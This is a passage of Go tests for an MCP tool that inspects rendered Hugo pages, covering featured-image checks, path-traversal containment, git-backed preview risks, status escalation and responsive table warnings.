	if err := os.WriteFile(filepath.Join(contentRoot, "posts", "traversal", "index.md"), []byte(page), 0o644); err != nil {
		t.Fatalf("write content: %v", err)
	}

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClientWithSource(t, siteRoot, contentRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/traversal/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	checks := findChecks(t, data)
	fi, ok := checks["featured_image"]
	if !ok {
		t.Fatalf("missing featured_image check, got checks = %v", checks)
	}
	if fi["status"] != "fail" {
		t.Fatalf("featured_image status = %v, want fail — traversal must be rejected, not resolved (detail=%v)", fi["status"], fi["detail"])
	}
	detail, _ := fi["detail"].(string)
	if strings.Contains(detail, "exists=true") || strings.Contains(detail, "dimensions=") {
		t.Fatalf("featured_image detail = %q leaked information about a path outside SiteRoot — containment regressed", detail)
	}
}

// TestInspectRenderedPageFeaturedImageWarnsOnMissingAltAndOGMismatch is a
// regression test for #818: an existing featuredImage whose rendered <img>
// has no alt text and whose og:image doesn't match must warn (fixable, not
// broken), not fail or silently pass.
func TestInspectRenderedPageFeaturedImageWarnsOnMissingAltAndOGMismatch(t *testing.T) {
	siteRoot := t.TempDir()
	contentRoot := t.TempDir()

	writeRenderedHTML(t, siteRoot, "posts/sloppy-hero/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Sloppy Hero</title>
<meta name="description" content="A post with alt/og issues on its hero image.">
<link rel="canonical" href="https://example.test/posts/sloppy-hero/">
<meta property="og:image" content="https://example.test/images/wrong-image.jpg">
</head>
<body>
<img data-src="/images/sloppy-featured.jpg">
</body>
</html>`)
	if err := os.MkdirAll(filepath.Join(siteRoot, "images"), 0o755); err != nil {
		t.Fatalf("mkdir images: %v", err)
	}
	if err := os.WriteFile(filepath.Join(siteRoot, "images", "sloppy-featured.jpg"), []byte("not-a-real-jpeg-but-non-empty"), 0o644); err != nil {
		t.Fatalf("write image: %v", err)
	}

	if err := os.MkdirAll(filepath.Join(contentRoot, "posts", "sloppy-hero"), 0o755); err != nil {
		t.Fatalf("mkdir content: %v", err)
	}
	page := "---\ntitle: Sloppy Hero\nfeaturedImage: /images/sloppy-featured.jpg\n---\n\nBody.\n"
	if err := os.WriteFile(filepath.Join(contentRoot, "posts", "sloppy-hero", "index.md"), []byte(page), 0o644); err != nil {
		t.Fatalf("write content: %v", err)
	}

	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClientWithSource(t, siteRoot, contentRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/sloppy-hero/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	if got := data["status"]; got != "warnings_found" {
		t.Fatalf("status = %v, want warnings_found", got)
	}
	checks := findChecks(t, data)
	fi := checks["featured_image"]
	if fi["status"] != "warn" {
		t.Fatalf("featured_image status = %v, want warn (detail=%v)", fi["status"], fi["detail"])
	}
	detail, _ := fi["detail"].(string)
	if !strings.Contains(detail, "no alt text") {
		t.Fatalf("featured_image detail = %q, want it to mention missing alt text", detail)
	}
	if !strings.Contains(detail, "og:image") {
		t.Fatalf("featured_image detail = %q, want it to mention the og:image mismatch", detail)
	}
}

func TestInspectRenderedPageUnknownSlugReturnsNotFound(t *testing.T) {
	siteRoot := t.TempDir()
	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/does/not/exist/"})
	if !res.IsError {
		t.Fatalf("inspect_rendered on unknown slug: want error, got success")
	}
}

func TestInspectRenderedPageEmptySlugIsInvalidParams(t *testing.T) {
	siteRoot := t.TempDir()
	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "   "})
	if !res.IsError {
		t.Fatalf("inspect_rendered with blank slug: want error, got success")
	}
}

// newInspectRenderedPagePreviewClient wires inspect_rendered with both a
// built site.Index (rendered HTML on disk, for the checks) and a real
// hugosite.SourceIndex backed by a git repository (for #435's
// include_preview facet, which needs diff_page's git logic and
// validate_frontmatter's per-page checks to have something real to read).
func newInspectRenderedPagePreviewClient(t *testing.T, siteRoot, contentRoot string) (*mcp.ClientSession, func()) {
	t.Helper()
	idx := inspectRenderedPageIndex(t, siteRoot)
	srcIdx, err := hugosite.NewSourceIndex(contentRoot)
	if err != nil {
		t.Fatalf("NewSourceIndex() error = %v", err)
	}
	cfg := inspectRenderedPageConfig(siteRoot)
	cfg.ContentRoot = contentRoot
	return newTestClientWithCfg(t, idx, cfg, srcIdx)
}

// TestInspectRenderedPageIncludePreviewSurfacesRisks is a regression test
// for #435: include_preview=true composes diff_page's git-diff status,
// get_broken_links' per-page scan, and validate_frontmatter's checks into
// one risks list, on a page that has all three at once (uncommitted
// change, a broken internal link, and a missing title in front matter).
func TestInspectRenderedPageIncludePreviewSurfacesRisks(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/hello/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Hello World</title>
<meta name="description" content="A short, valid description of this page.">
<link rel="canonical" href="https://example.test/posts/hello/">
</head>
<body>
<p>Hello. <a href="/posts/missing/">a broken link</a></p>
</body>
</html>`)

	root := t.TempDir()
	contentRoot := filepath.Join(root, "content")
	pagePath := filepath.Join(contentRoot, "posts", "hello", "index.md")
	if err := os.MkdirAll(filepath.Dir(pagePath), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	// No title in front matter (missing_title issue for validate_frontmatter).
	if err := os.WriteFile(pagePath, []byte("---\ndate: 2026-07-03\n---\nHello world.\n"), 0o644); err != nil {
		t.Fatalf("write page: %v", err)
	}
	runGit(t, root, "init")
	runGit(t, root, "config", "user.email", "test@example.test")
	runGit(t, root, "config", "user.name", "Test User")
	runGit(t, root, "add", ".")
	runGit(t, root, "commit", "-m", "initial")
	if err := os.WriteFile(pagePath, []byte("---\ndate: 2026-07-03\n---\nHello brave new world.\n"), 0o644); err != nil {
		t.Fatalf("rewrite page: %v", err)
	}

	session, done := newInspectRenderedPagePreviewClient(t, siteRoot, contentRoot)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hello/", "include_preview": true})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	preview, ok := data["preview"].(map[string]any)
	if !ok {
		t.Fatalf("preview type = %T, want map[string]any", data["preview"])
	}
	if got := preview["diff_status"]; got != "modified" {
		t.Fatalf("preview.diff_status = %v, want modified", got)
	}
	if summary, _ := preview["diff_summary"].(string); !strings.Contains(summary, "added") {
		t.Fatalf("preview.diff_summary = %q, want a line-count summary", summary)
	}
	if got := preview["broken_links_count"]; got != float64(1) {
		t.Fatalf("preview.broken_links_count = %v, want 1", got)
	}
	if got := preview["frontmatter_valid"]; got != false {
		t.Fatalf("preview.frontmatter_valid = %v, want false (missing title)", got)
	}
	issues, ok := preview["frontmatter_issues"].([]any)
	if !ok || len(issues) == 0 {
		t.Fatalf("preview.frontmatter_issues = %#v, want at least one issue", preview["frontmatter_issues"])
	}
	risks, ok := preview["risks"].([]any)
	if !ok || len(risks) != 3 {
		t.Fatalf("preview.risks = %#v, want exactly 3 (diff, broken link, frontmatter)", preview["risks"])
	}
}

// TestInspectRenderedPageStatusEscalatesFromWarningsWhenPreviewFrontmatterInvalid
// is a regression test for #1046: invalid preview frontmatter must escalate
// the top-level status to "issues_found" even when the checks loop already
// produced "warnings_found" (a lower severity), not just from "ok" — the
// same way a "fail" in the checks loop always wins over a "warn", regardless
// of which ran first.
func TestInspectRenderedPageStatusEscalatesFromWarningsWhenPreviewFrontmatterInvalid(t *testing.T) {
	longDescription := strings.Repeat("a", 200)
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/hello/index.html", `<!DOCTYPE html>
<html lang="en">
<head>
<title>Hello World</title>
<meta name="description" content="`+longDescription+`">
<link rel="canonical" href="https://example.test/posts/hello/">
</head>
<body>
<p>Hello world, no broken links or missing images here.</p>
</body>
</html>`)

	root := t.TempDir()
	contentRoot := filepath.Join(root, "content")
	pagePath := filepath.Join(contentRoot, "posts", "hello", "index.md")
	if err := os.MkdirAll(filepath.Dir(pagePath), 0o755); err != nil {
		t.Fatalf("mkdir: %v", err)
	}
	// No title in front matter (missing_title issue for validate_frontmatter).
	if err := os.WriteFile(pagePath, []byte("---\ndate: 2026-07-03\n---\nHello world.\n"), 0o644); err != nil {
		t.Fatalf("write page: %v", err)
	}

	session, done := newInspectRenderedPagePreviewClient(t, siteRoot, contentRoot)
	defer done()

	// First confirm the checks loop alone (no preview) lands on
	// "warnings_found", not "issues_found" — otherwise this test wouldn't
	// actually exercise the escalation-from-warnings path.
	warnOnly := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hello/"})
	if warnOnly.IsError {
		t.Fatalf("inspect_rendered returned error: %v", warnOnly.Content[0].(*mcp.TextContent).Text)
	}
	warnOnlyData := decodeContent(t, warnOnly)
	if got := warnOnlyData["status"]; got != "warnings_found" {
		t.Fatalf("status without preview = %v, want warnings_found (overlong meta description) — test precondition not met", got)
	}

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hello/", "include_preview": true})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	preview, ok := data["preview"].(map[string]any)
	if !ok {
		t.Fatalf("preview type = %T, want map[string]any", data["preview"])
	}
	if got := preview["frontmatter_valid"]; got != false {
		t.Fatalf("preview.frontmatter_valid = %v, want false (missing title)", got)
	}
	if got := data["status"]; got != "issues_found" {
		t.Fatalf("status = %v, want issues_found (invalid preview frontmatter must escalate past warnings_found, not be silently masked by it)", got)
	}
}

// TestInspectRenderedPageOmitsPreviewByDefault is a regression test for
// #435: omitting include_preview must not add the preview field at all,
// preserving every existing caller's response shape and cost.
func TestInspectRenderedPageOmitsPreviewByDefault(t *testing.T) {
	siteRoot := t.TempDir()
	writeRenderedHTML(t, siteRoot, "posts/hello/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Hello World</title><meta name="description" content="A short, valid description of this page."><link rel="canonical" href="https://example.test/posts/hello/"></head>
<body><p>Hello.</p></body>
</html>`)
	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/hello/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	if _, ok := data["preview"]; ok {
		t.Fatalf("preview = %#v, want omitted when include_preview is not requested", data["preview"])
	}
}

// TestInspectRenderedPageResponsiveChecksSurfacesTableRisk is an
// end-to-end regression test for #1138: a wide, unwrapped table with a long
// unbreakable cell must show up in responsive_checks without affecting the
// page's overall status (purely additive, heuristic-only surface).
func TestInspectRenderedPageResponsiveChecksSurfacesTableRisk(t *testing.T) {
	siteRoot := t.TempDir()
	longToken := strings.Repeat("a", 40)
	writeRenderedHTML(t, siteRoot, "posts/wide-table/index.html", `<!DOCTYPE html>
<html lang="en">
<head><title>Wide Table</title><meta name="description" content="A page with a very wide unwrapped table in it."><link rel="canonical" href="https://example.test/posts/wide-table/"></head>
<body>
<table style="width:900px"><tr><td>`+longToken+`</td></tr></table>
</body>
</html>`)
	idx := inspectRenderedPageIndex(t, siteRoot)
	session, done := newInspectRenderedPageClient(t, siteRoot, idx)
	defer done()

	res := callTool(t, session, "inspect_rendered", map[string]any{"slug": "/posts/wide-table/"})
	if res.IsError {
		t.Fatalf("inspect_rendered returned error: %v", res.Content[0].(*mcp.TextContent).Text)
	}
	data := decodeContent(t, res)
	if got := data["status"]; got != "ok" {
		t.Fatalf("status = %v, want ok (responsive_checks must not affect status)", got)
	}
	rc, ok := data["responsive_checks"].(map[string]any)
	if !ok {
		t.Fatalf("responsive_checks field type = %T, want present map", data["responsive_checks"])
	}
	tables, ok := rc["tables"].(map[string]any)
	if !ok {
		t.Fatalf("responsive_checks.tables type = %T", rc["tables"])
	}
	if tables["count"] != float64(1) {
		t.Fatalf("tables.count = %v, want 1", tables["count"])
	}
	if tables["fixed_width"] != float64(1) {
		t.Fatalf("tables.fixed_width = %v, want 1", tables["fixed_width"])
	}
	if tables["responsive_wrapper"] != float64(0) {
		t.Fatalf("tables.responsive_wrapper = %v, want 0", tables["responsive_wrapper"])
	}
	if tables["long_cell_risk"] != float64(1) {
		t.Fatalf("tables.long_cell_risk = %v, want 1", tables["long_cell_risk"])
	}
}
